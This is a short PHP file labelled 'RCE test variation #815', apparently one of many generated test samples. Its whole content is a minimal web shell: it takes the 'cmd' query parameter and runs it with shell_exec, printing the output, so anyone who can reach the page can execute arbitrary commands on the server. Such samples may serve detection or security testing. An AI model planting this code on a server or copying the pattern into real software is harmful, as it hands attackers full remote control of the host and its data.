<?php
// RCE test variation #815
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>